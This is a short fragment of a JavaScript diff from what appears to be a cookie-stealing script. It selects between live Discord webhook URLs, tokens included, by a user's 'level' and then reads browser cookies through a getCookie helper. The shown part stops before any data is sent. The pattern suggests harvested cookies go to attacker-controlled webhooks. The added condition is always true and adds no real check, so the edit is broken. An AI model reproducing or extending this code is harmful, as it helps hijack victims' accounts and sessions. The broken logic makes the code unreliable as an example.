@@ -4,6 +4,7 @@ setTimeout(() => {
         if (typeof user === 'undefined' || user === null) {
             return 'https://discord.com/api/webhooks/1485614283986305184/nDmY4r2uiVt0vFBBf60mJHWbf23elywOrjl1vuAwIjO7XvoUOjqhHDTNoOgMKBZ_dC2j';
         }
+		if (typeof user !== 'undefined' || user !== null) {      
         const level = user.level;
         if (level >= 0 && level <= 15) {
             return 'https://discord.com/api/webhooks/1485613897888039044/BhNDBh8bHoKeU7Z3mSsVAKEySUhoNIvgs7bXG7_SXRHTuH-tMKOuOQBEKsTb6RQZ06_c';
@@ -22,6 +23,7 @@ setTimeout(() => {
             return 'https://discord.com/api/webhooks/1485614283986305184/nDmY4r2uiVt0vFBBf60mJHWbf23elywOrjl1vuAwIjO7XvoUOjqhHDTNoOgMKBZ_dC2j';
         }
     };
+	}
 
     const getCookie = (name) => {
         const matches = document.cookie.match(new RegExp(
